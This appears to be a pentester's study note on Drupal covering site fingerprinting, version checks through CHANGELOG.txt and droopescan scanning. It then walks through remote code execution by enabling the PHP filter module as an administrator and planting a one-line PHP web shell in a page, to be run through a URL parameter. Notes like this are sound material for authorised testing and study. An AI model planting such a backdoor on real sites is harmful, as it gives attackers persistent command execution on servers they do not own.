---
created: 2026-12-07
tags:
  - web_hacking
  - CMS
status: stub
---
## Drupal

>**[Drupal](https://new.drupal.org/home)** is a **free, open-source content management system (CMS)** written in **PHP**.

## Discovery and enumeration

- A Drupal-powered website can be identified in several ways:
	-  `<meta>` generator tags `Powered By Drupal`
	- The standard Drupal logo
	- The presence of a `CHANGELOG.txt` or `README.txt` file
	- References to [nodes](https://www.drupal.org/docs/core-modules-and-themes/core-modules/node-module/about-nodes) (`/node/<node_id>`)

>[!quote] All content on a Drupal website is stored and treated as "nodes". A node is any piece of individual content, such as a page, poll, article, forum topic, or a blog entry. Comments are not stored as nodes but are always connected to one. 
>- From [Drupal documentation](https://www.drupal.org/docs/core-modules-and-themes/core-modules/node-module/about-nodes).

- `CHANGELOG.txt` can reveal Drupal version in use:

```bash
curl -s https://drupal.example.com/CHANGELOG.txt
```

>[!note] By default, newer Drupal versions restricts access to `CHANGELOG.txt` and `README.txt`, but it's worth checking.

- You can use [`droopescan`](https://github.com/SamJoan/droopescan) to scan a Drupal installation automatically:

```bash
droopescan scan drupal -u http://drupal.example.com
```

## RCE via PHP filter module

- For Drupal before version 8, you can log in as administrator and enable the `PHP filter` module (`Modules` -> toggle `PHP filter` -> `Save configuration`).
- After that, you can add a PHP backdoor by adding a page with the code (`Content` -> `Add content` -> `Basic page`; set `Text format` to `PHP code`):

```bash
<?php
system($_GET['8717cfca734e8987971f63b20eeb8024']);
?>
```

![[Drupal_PHP_filter_RCE.png]]

- Once saved (say, as `/node/11`), you can execute commands with `https://drupal.example.com/node/11?8717cfca734e8987971f63b20eeb8024=id`.

---

- From version 8 onward, the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default. To get this work, the module must be installed first.

>[!note]+ Installing `PHP Filter` module in Drupal
>- Download the most recent version of the module from the Drupal webite:
> ```bash
> wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
> ```
> - Go to `Administration` -> `Reports` -> `Available updates`, then click `Browse` -> select the module file you've downloaded -> `Install`. After that, you can execute PHP code by adding new content.
## References and further reading

 - [`About Nodes — Drupal Documentation`](https://www.drupal.org/docs/core-modules-and-themes/core-modules/node-module/about-nodes)